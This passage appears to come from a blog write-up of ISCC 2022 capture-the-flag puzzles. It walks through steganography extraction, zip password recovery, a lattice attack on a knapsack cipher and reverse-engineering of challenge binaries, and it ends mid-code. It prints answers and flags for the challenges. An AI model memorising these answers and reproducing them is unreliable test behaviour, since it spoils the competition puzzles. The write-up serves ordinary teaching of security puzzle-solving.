<p>然后使用 <code>zsteg 文件名 -a</code> 命令发现 <code>b1,r,lsb,yx</code> 还有一张 <code>png</code> 图片</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220502113011252.png" alt="image-20220502113011252"></p>
<p>我们使用 <code>zsteg -E 'b1,r,lsb.yx' 文件名 > flag.png</code> 提取出这张图片</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220502113249665.png" alt="image-20220502113249665"></p>
<p>根据图片名百度 <code>魔女之旅 文字</code> 找到了两篇文章</p>
<p>《魔女之旅》文字破解：<a href="https://www.bilibili.com/read/cv7855745">https://www.bilibili.com/read/cv7855745</a></p>
<p>《魔女之旅》文字破解·印刷体：<a href="https://www.bilibili.com/read/cv8724055">https://www.bilibili.com/read/cv8724055</a></p>
<p>重要的就是下面那两张图，直接对比出来相应的英文<strong>大写</strong>字母即可（眼都看瞎了），flag格式：ISCC{<strong><strong>-</strong></strong>-****}</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220502113202447.png" alt="image-20220502113202447"></p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220502113220924.png" alt="image-20220502113220924"></p>
<h3 id="藏在星空中的诗-1">藏在星空中的诗-1</h3>
<blockquote>
<p>漫天的繁星也许是一首美丽的诗！（建议使用winRAR）</p>
</blockquote>
<p>下载后三个附件 <code>Stars.psd</code>、<code>Poem.txt</code> 和 加密压缩包<code>Poem_is_the_Key.zip</code></p>
<p>Ps打开<code>Stars.psd</code>文件，<code>图层1</code> 不透明度改为 <code>100</code>，发现出来一个有箭头指向的星星</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220502113929472.png" alt="image-20220502113929472"></p>
<p>我们直接把 <code>Poem.txt</code> 通过上面星星的指向顺序 <code>13524</code> 排列出 <code>Poem_is_the_Key.zip</code> 的解压密码（一定要用Winrar，其他解压软件应该不支持这种密码）。</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220502114123042.png" alt="image-20220502114123042"></p>
<p>压缩包解密后得到一个表格</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220502114506034.png" alt="image-20220502114506034"></p>
<p>然后把 <code>Poem.txt</code> 里面的星星，对照着表格中的字母敲出来，第一行为 <code>FLAG=</code> ，第二行为 <code>ISCC{</code> ，依此对照敲出 <code>三四五</code> 行</p>
<p>Flag格式：<code>ISCC{14个大写字符}</code></p>
<h3 id="真相只有一个">真相只有一个</h3>
<blockquote>
<p>misc是英文miscellaneous的前四个字母，表示有杂项、混合体、大杂烩的意思，题目思路广，模式不定，线索众多，在这些线索中有的有用有的没用，最终的真相只有一个。</p>
</blockquote>
<p>打开 <code>flag.txt</code> 全选后发现有点像 <code>snow</code>，解密密码猜了一下，直接 <code>snow.exe -C -p isccmisc flag.txt</code>，得到flag</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220502132525237.png" alt="image-20220502132525237"></p>
<h3 id="小光学ai">小光学AI</h3>
<blockquote>
<p>小光同学最近在学习人工智能技术，看了周志华老师的西瓜书后，感觉自己又行了。
这次他找来了三种水果的图片：黄瓜、茄子和蘑菇，研究的第一步是区分这三种水果，将三种水果分类；第二步是图像分割，选中目标区域，目标区域指的是能够覆盖图片中水果区域的最小矩形。
做完后小光同学计算出了三种水果目标区域的像素和A,B,C（0&#x3C;A,B,C&#x3C;10^9），发现这些像素和可以化简到x:y:z，其中（0&#x3C;x,y,z&#x3C;10），你可以找到A，B，C三者的实际值之比吗（格式A：B：C）？</p>
<p>Flag格式：ISCC{XXX}</p>
</blockquote>
<p>没学过AI，题干也没看懂直接按照题目中提到的格式生成字典爆破</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#E1E4E8">out </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> []</span></span>
<span class="line" data-line="2"><span style="color:#E1E4E8">fp </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"encode.txt"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"w+"</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">encoding</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"ANSI"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="3"></span>
<span class="line" data-line="4"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8"> ,</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="5"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> j </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="6"><span style="color:#F97583">        for</span><span style="color:#E1E4E8"> m </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="7"><span style="color:#F97583">            for</span><span style="color:#E1E4E8"> n </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">10000</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">100000</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">                fp.write(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">{0}</span><span style="color:#9ECBFF">：</span><span style="color:#79B8FF">{1}</span><span style="color:#9ECBFF">：</span><span style="color:#79B8FF">{2}\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">.format(i</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">n, j</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">n, m</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">n))</span></span>
<span class="line" data-line="9"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Done"</span><span style="color:#E1E4E8">)</span></span></code></pre>
<hr>
<p>解压密码</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>37035：49380：61725</span></span></code></pre>
<h3 id="2022冬奥会">2022冬奥会</h3>
<blockquote>
<p>2022冬奥会在北京举办，身为东道主的你知道此次冬奥会的吉祥物分别是谁吗？并且你知道这两只冬奥会的吉祥物最初设计的原型分别是什么吗？我只能提示你其中有一只的原型是我们的国宝哦。</p>
</blockquote>
<p>这题没什么好说的，冰墩墩原型是熊猫，雪容融原型是灯笼，所以解压密码是：<code>灯笼</code> 解压之后记事本打开图片，得到flag</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220510144419395.png" alt="image-20220510144419395"></p>
<h3 id="藏在星空中的诗-2">藏在星空中的诗-2</h3>
<blockquote>
<p>漫天的繁星也许是另一首美丽的诗！</p>
</blockquote>
<p>打开后如图所示，和 <code>藏在星空中的诗-1</code> 差不多，直接对照着 <code>藏在星空中的诗-1</code> 中的表格敲出密文。</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220510211223983.png" alt="image-20220510211223983"></p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>\QTTPU\QTTED\QTTPD\QTTPD\QTTKB\QTTPK\QTTFB\QTTPD\QTTFK\QTTFO\QTTKT\QTTFE\QTTKG\QTTKD\QTTFU\QTTPG\QTTDU\QTTKU\QTTPK\QTTKH</span></span></code></pre>
<p>然后 <code>QTT</code> 批量替换为 <code>u00</code>，然后对照着表格进行解密。示例 <code>QYYPU = u0049</code></p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220510144818336.png" alt="image-20220510144818336"></p>
<p>最后得到一段 <code>unicode</code> ，直接解密即可</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>\u0049\u0053\u0043\u0043\u007B\u0047\u006B\u0043\u0067\u006F\u0070\u0065\u007A\u0073\u0069\u004A\u0039\u0079\u0047\u007D</span></span></code></pre>
<h3 id="隐秘的信息">隐秘的信息</h3>
<blockquote>
<p>乐乐在开始做作业时，遇到了一串ZWFzeV90b19maW5kX3RoZV9mbGFn字符串，研究了一番，什么都没有发现。乐乐能找到隐秘的信息并完成作业吗？</p>
</blockquote>
<p>题干中的字符串是 <code>base64</code> 编码，直接解密得到压缩包的解压密码 <code>easy_to_find_the_flag</code> ，使用 <code>StegSolve</code> 发现图片是 <code>LSB</code> 隐写（<code>R0/G0/B0</code>），直接复制我选中的字符串，如下所示。</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220511182630592.png" alt="image-20220511182630592"></p>
<p>删掉右侧多余的乱码字符串，只保留左侧的16进制代码，如下所示。</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>fff495343437b6b5 4336a74507377355  23759365270796a4 e7a307dc01f8007f  fffc7e3fe00fff00 71</span></span></code></pre>
<p>使用 <code>CyberChef</code> 先 <code>From Hex</code> 在 <code>To Binary</code> 得到一串二进制代码。</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220511182812500.png" alt="image-20220511182812500"></p>
<p>直接把前面的 <code>1</code> 删掉，然后再 <code>From Binary</code> 转换为字符串就会出现flag。</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220511182949210.png" alt="image-20220511182949210"></p>
<h3 id="套中套">套中套</h3>
<blockquote>
<p>亲爱的CTFer走到一个巨大的盒子前，上面写满了0和1，却也看不出个所以然。仔细看了半夜，才在字缝中看出来，整个盒子都写着“套中套”……</p>
</blockquote>
<p>下载附件得到俩文件 <code>tzt.png</code> 和加密压缩包 <code>tzt2.zip</code> ，打开 <code>png</code> 提示文件损坏，010编辑器打开在末尾发现一段 <code>base64</code>，解码后得到<code>flag2: _ISCC_Zo2z</code>。</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220518104938144.png" alt="image-20220518104938144"></p>
<p>然后很明显看到缺了文件头，直接补上 <code>89504e470d0a1a0a0000000d</code> ，正常打开图片… 啥也没有。</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220518104500535.png" alt="image-20220518104500535"></p>
<p>直接修改 <code>高度</code> 得到 <code>wELC0m3_</code></p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220518104743023.png" alt="image-20220518104743023"></p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220518104755549.png" alt="image-20220518104755549"></p>
<p>尝试了各种组合，还是解不开压缩包，也得不到 <code>flag3</code> 在哪，最后靠学弟猜出了完整的字符串：<code>wELC0m3_T0_tH3_ISCC_Zo2z</code> ，使用这段字符串解压压缩包。</p>
<p>解压后得到一堆文件，百度了一番发现是原题（背包加密）：<a href="https://ctf-wiki.org/crypto/asymmetric/knapsack/knapsack/#_9">https://ctf-wiki.org/crypto/asymmetric/knapsack/knapsack/#_9</a> ，直接用脚本一把梭了。</p>
<p>直接把解压后 <code>pub.Key</code> 和 <code>enc.txt</code> 文件内容填入下面的脚本中。然后使用 <a href="https://sagecell.sagemath.org/">https://sagecell.sagemath.org/</a> 在线运行。</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#E1E4E8">pubKey </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> </span></span>
<span class="line" data-line="2"><span style="color:#E1E4E8">nbit </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> len</span><span style="color:#E1E4E8">(pubKey)</span></span>
<span class="line" data-line="3"><span style="color:#E1E4E8">encoded </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> </span></span>
<span class="line" data-line="4"><span style="color:#E1E4E8">A </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> Matrix(</span><span style="color:#79B8FF">ZZ</span><span style="color:#E1E4E8">, nbit </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">, nbit </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="5"></span>
<span class="line" data-line="6"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(nbit):</span></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">    A[i, i] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1</span></span>
<span class="line" data-line="8"></span>
<span class="line" data-line="9"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(nbit):</span></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">    A[i, nbit] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> pubKey[i]</span></span>
<span class="line" data-line="11"></span>
<span class="line" data-line="12"><span style="color:#E1E4E8">A[nbit, nbit] </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#E1E4E8">(encoded)</span></span>
<span class="line" data-line="13"></span>
<span class="line" data-line="14"><span style="color:#E1E4E8">res </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> A.LLL()</span></span>
<span class="line" data-line="15"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, nbit </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">    </span></span>
<span class="line" data-line="17"><span style="color:#E1E4E8">    M </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> res.row(i).list()</span></span>
<span class="line" data-line="18"><span style="color:#E1E4E8">    flag </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> True</span></span>
<span class="line" data-line="19"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> m </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> M:</span></span>
<span class="line" data-line="20"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> m </span><span style="color:#F97583">!=</span><span style="color:#79B8FF"> 0</span><span style="color:#F97583"> and</span><span style="color:#E1E4E8"> m </span><span style="color:#F97583">!=</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="21"><span style="color:#E1E4E8">            flag </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> False</span></span>
<span class="line" data-line="22"><span style="color:#F97583">            break</span></span>
<span class="line" data-line="23"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> flag </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> True</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="24"><span style="color:#E1E4E8">        M </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ''</span><span style="color:#E1E4E8">.join(</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(j) </span><span style="color:#F97583">for</span><span style="color:#E1E4E8"> j </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> M)</span></span>
<span class="line" data-line="25"><span style="color:#E1E4E8">        M </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> M[:</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="26"><span style="color:#E1E4E8">        M </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> hex</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">int</span><span style="color:#E1E4E8">(M, </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">))[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:]</span></span>
<span class="line" data-line="27"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">hex</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">int</span><span style="color:#E1E4E8">(M,</span><span style="color:#79B8FF">16</span><span style="color:#E1E4E8">)))</span></span></code></pre>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220518105636374.png" alt="image-20220518105636374"></p>
<p>然后直接十六进制转字符串即可</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220518105713329.png" alt="image-20220518105713329"></p>
<h3 id="666">666</h3>
<blockquote>
<p>小孔同学最近新加入了一个实验室，作为一名菜鸡，每天的重要工作之一就是给大佬喊666。不过如今喊666的方式也要创新，你有什么好的办法吗？</p>
<p>注：本题结果X加上ISCC{}写作ISCC{X}</p>
</blockquote>
<p>压缩包有伪加密，直接修复一下</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220525075847540.png" alt="image-20220525075847540"></p>
<p>解压后得到加密压缩包 <code>flag.rar</code> 和 一张熊本熊的图片，使用 <code>steghide</code> 解密熊本熊图，密码随便试了个弱口令成功了</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220525081046327.png" alt="image-20220525081046327"></p>
<p>得到半截 <code>png</code> 图片，图片高度修改为 <code>300</code> 得到压缩包密码 <code>!@#$%678()_+</code></p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220525081155778.png" alt="image-20220525081155778"></p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220525081206214.png" alt="image-20220525081206214"></p>
<p>解压压缩包后得到 <code>stream.pcapng</code> ，看到了里面有 <code>http</code> 请求，我们直接导出 <code>http</code> 请求</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220525082947756.png" alt="image-20220525082947756"></p>
<p>在json文件中发现一个网址</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220525083101751.png" alt="image-20220525083101751"></p>
<p>打开 <code>https://www.cnblogs.com/konglingdi/p/14998301.html</code> 发现一张千与千寻的图，而且可以看到有东西一闪而过了</p>
<p>第七帧</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>SElERWtleTo4NTIgOTg3NDU2MzIxIDk4NDIzIDk4NDIzIFJFQUxrZXk6eFN4eA==</span></span></code></pre>
<p>base64解密后得到</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>HIDEkey:852 987456321 98423 98423 REALkey:xSxx</span></span></code></pre>
<p><code>852 987456321 98423</code> 通过手机九键键盘加密可以得出 <code>ISCC</code> ，大概就是下面这个意思</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220525085047647.png" alt="image-20220525085047647"></p>
<p>第16帧</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>pQLKpP/</span></span></code></pre>
<p>第26帧</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>EPmw301eZRzuYvQ==</span></span></code></pre>
<hr>
<p>第 <code>16</code> 帧和第<code>26</code> 帧拼接到一块，然后 <code>AES</code> 解密，密码 <code>ISCC</code>，得到flag</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220525085324875.png" alt="image-20220525085324875"></p>
<h2 id="reverse">REVERSE</h2>
<h3 id="amys-code">Amy’s Code</h3>
<blockquote>
<p>代码好像有点眼熟？</p>
</blockquote>
<p><code>ida x32</code> 打开，直接定位到 <code>sub_412550</code> ，<code>F5</code> 查看伪代码。</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220507131421589.png" alt="image-20220507131421589"></p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#E1E4E8">v9 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="2"><span style="color:#6A737D"># v9[0] - v9[19]</span></span>
<span class="line" data-line="3"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 149</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="4"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 169</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="5"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 137</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="6"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 134</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 212</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 188</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="9"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 177</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 184</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 177</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="12"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">9</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 197</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="13"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 192</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="14"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">11</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 179</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="15"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">12</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 153</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">13</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 163</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="17"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">14</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 195</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="18"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">15</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 137</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="19"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">16</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 112</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="20"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">17</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 189</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="21"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">18</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 110</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="22"><span style="color:#E1E4E8">v9[</span><span style="color:#79B8FF">19</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 184</span><span style="color:#FDAEB7;font-style:italic">;</span></span>
<span class="line" data-line="23"></span>
<span class="line" data-line="24"><span style="color:#E1E4E8">str1 </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'LWHFUENGDJGEFHYDHIGJ'</span></span>
<span class="line" data-line="25"><span style="color:#E1E4E8">flag </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ''</span></span>
<span class="line" data-line="26"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">len</span><span style="color:#E1E4E8">(str1)):</span></span>
<span class="line" data-line="27"><span style="color:#E1E4E8">    flag </span><span style="color:#F97583">+=</span><span style="color:#79B8FF"> chr</span><span style="color:#E1E4E8">(v9[i] </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> ord</span><span style="color:#E1E4E8">(str1[i])</span><span style="color:#F97583">^</span><span style="color:#E1E4E8">i)</span></span>
<span class="line" data-line="28"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(flag)</span></span></code></pre>
<h3 id="how_decode">How_decode</h3>
<blockquote>
<p>只要你输入的是正确答案，程序就会告诉你，你是对的，加油</p>
</blockquote>
<p><code>ida x64</code> 打开，直接定位到 <code>main</code> 函数，<code>F5</code> 查看伪代码。</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220507131502071.png" alt="image-20220507131502071"></p>
<p><code>Encode函数</code> 把 <code>v2</code> 加密了，加密后的 <code>v2</code> 数组和 <code>p_v1</code> 数组进行比较（全部相等输出正确）</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line" data-line="1"><span style="color:#B392F0">encode</span><span style="color:#E1E4E8">(v2, n, k);</span></span>
<span class="line" data-line="2"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> ( i_0 </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; i_0 </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8"> n; </span><span style="color:#F97583">++</span><span style="color:#E1E4E8">i_0 )</span></span>
<span class="line" data-line="3"><span style="color:#E1E4E8">{</span></span>
